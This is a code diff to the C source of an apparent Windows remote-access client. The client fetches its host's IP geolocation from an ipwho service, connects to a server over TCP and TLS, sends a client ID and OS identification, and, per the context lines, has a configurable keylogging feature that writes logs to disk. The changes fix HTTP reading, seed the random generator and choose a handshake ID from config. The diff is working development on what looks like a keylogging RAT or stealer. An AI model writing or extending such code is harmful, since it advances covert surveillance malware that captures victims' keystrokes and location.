@@ -108,8 +108,11 @@ static int remote_http_get_ipwho_json(char* out_json, size_t out_json_sz) {
         WINHTTP_FLAG_SECURE);
     if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return 0; }
 
+    const wchar_t* acceptEncoding = L"Accept-Encoding: identity\r\n";
+    DWORD acceptEncodingLen = (DWORD)wcslen(acceptEncoding);
+
     BOOL ok = WinHttpSendRequest(hRequest,
-        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+        acceptEncoding, acceptEncodingLen,
         WINHTTP_NO_REQUEST_DATA, 0,
         0, 0);
     if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);
@@ -121,18 +124,21 @@ static int remote_http_get_ipwho_json(char* out_json, size_t out_json_sz) {
         return 0;
     }
 
-    DWORD dwAvailable = 0;
     size_t total = 0;
-    while (WinHttpQueryDataAvailable(hRequest, &dwAvailable) && dwAvailable > 0) {
-        DWORD toRead = dwAvailable;
-        if (total + toRead >= out_json_sz) toRead = (DWORD)(out_json_sz - 1 - total);
-        if (toRead == 0) break;
+    {
+        char tmp[1024];
+        for (;;) {
+            DWORD dwRead = 0;
+            if (!WinHttpReadData(hRequest, tmp, sizeof(tmp), &dwRead)) break;
+            if (dwRead == 0) break;
 
-        DWORD dwRead = 0;
-        if (!WinHttpReadData(hRequest, out_json + total, toRead, &dwRead)) break;
-        total += dwRead;
+            if (total + dwRead >= out_json_sz) dwRead = (DWORD)(out_json_sz - 1 - total);
+            if (dwRead == 0) break;
 
-        if (dwRead == 0) break;
+            memcpy(out_json + total, tmp, dwRead);
+            total += dwRead;
+            if (total + 1 >= out_json_sz) break;
+        }
     }
 
     out_json[total] = '\0';
@@ -598,6 +604,9 @@ void remote_client_run(void) {
     }
     remote_log("config loaded: %s:%u", config.server_address, (unsigned)config.server_port);
 
+    /* Make sure fallback ID generation differs between client processes. */
+    srand((unsigned int)GetTickCount64());
+
     if (config.keylogging) {
         char logs_dir[MAX_PATH];
         if (!remote_get_logs_dir(logs_dir, sizeof(logs_dir))) {
@@ -625,7 +634,22 @@ void remote_client_run(void) {
         remote_log("TCP+TLS connected");
 
         char id_buf[65];
-        make_id(id_buf);
+        id_buf[0] = '\0';
+        if (config.uuid[0] != '\0') {
+            /* Server expects Id.Length == 64. */
+            size_t uuid_len = strlen(config.uuid);
+            if (uuid_len == 64 || uuid_len == 36) {
+                memcpy(id_buf, config.uuid, uuid_len);
+                id_buf[uuid_len] = '\0';
+            }
+        }
+        if (id_buf[0] == '\0') make_id(id_buf);
+
+        /* Help verify UUID parsing in config.json (view in DebugView). */
+        remote_log("[handshake] uuid_from_config='%s' chosen_id='%s' id_len=%u",
+            (config.uuid[0] ? config.uuid : ""),
+            id_buf,
+            (unsigned int)strlen(id_buf));
 
         remote_identification_t ident = { 0 };
         char os_full_name[256] = { 0 };
